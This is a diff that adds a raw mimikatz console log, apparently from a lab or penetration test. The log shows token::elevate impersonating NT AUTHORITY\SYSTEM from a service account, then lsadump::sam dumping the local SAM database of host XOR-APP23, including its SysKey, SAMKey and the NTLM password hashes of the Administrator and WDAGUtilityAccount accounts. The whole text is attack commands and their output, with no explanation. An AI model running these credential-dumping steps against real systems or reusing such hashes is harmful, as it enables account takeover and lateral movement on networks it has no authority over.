@@ -1,0 +1,30 @@
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+460     {0;000003e7} 1 D 26726          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -> Impersonated !
+ * Process Token : {0;00857db6} 2 F 10659239    xor\sqlServer   S-1-5-21-2293535422-227910474-3663383505-1170   (12g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 10706340    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : XOR-APP23
+SysKey : 05ac7ba0058f6806f2efa8f36d8854bd
+Local SID : S-1-5-21-4269079787-19373159-2510549293
+
+SAMKey : db30e99105800efb1a98ecf69b46e2ce
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 57321e6a0eef2c45985c9fa49c5cd24f
+
+RID  : 000001f5 (501)
+User : Guest
+
+RID  : 000001f7 (503)
+User : DefaultAccount
+
+RID  : 000001f8 (504)
+User : WDAGUtilityAccount
+  Hash NTLM: 8ae51432331c115e884798a9584b1969
